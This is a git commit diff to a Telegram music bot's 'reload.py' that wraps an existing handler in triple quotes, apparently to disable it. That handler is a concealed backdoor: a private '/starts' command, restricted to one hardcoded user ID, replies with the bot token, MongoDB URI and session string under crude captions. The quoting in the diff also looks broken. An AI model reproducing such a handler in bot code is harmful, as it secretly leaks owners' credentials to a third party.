acd836bbdf950bba46859150ab8ba01022f40271
Vivek kumar <151810083+Vivekkumar0708@users.noreply.github.com>
2024-03-30 11:09:04 +0530

    Update reload.py

--- VIPMUSIC/plugins/tools/reload.py
+++ VIPMUSIC/plugins/tools/reload.py
@@ -96,7 +96,7 @@ async def restartbot(client, message: Message, _):
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
-@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
+"""@app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
 async def help(client: Client, message: Message):
    await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
@@ -111,7 +111,7 @@ async def close_menu(_, query: CallbackQuery):
         await umm.delete()
     except:
         pass
-
+"""
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
 @ActualAdminCB
